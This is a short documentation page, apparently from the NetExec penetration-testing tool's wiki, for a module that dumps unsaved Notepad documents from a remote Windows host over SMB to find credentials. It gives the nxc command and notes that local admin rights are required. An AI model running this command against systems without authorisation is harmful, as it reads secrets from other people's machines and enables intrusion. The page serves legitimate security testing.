---
description: Dump unsaved Notepad documents
---

# 🆕 Dump Notepad

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

Finding credentials in unsaved Notepad files.

Sensible content into unsaved notepad documents can be dangerous, as they still leave traces on the system. This module dumps currently unsaved notepad app's documents:

```bash
nxc smb <ip> -u username -p password -M notepad
```

![image](https://github.com/user-attachments/assets/a49b0ab3-e892-4754-8812-4844f4f3a18a)
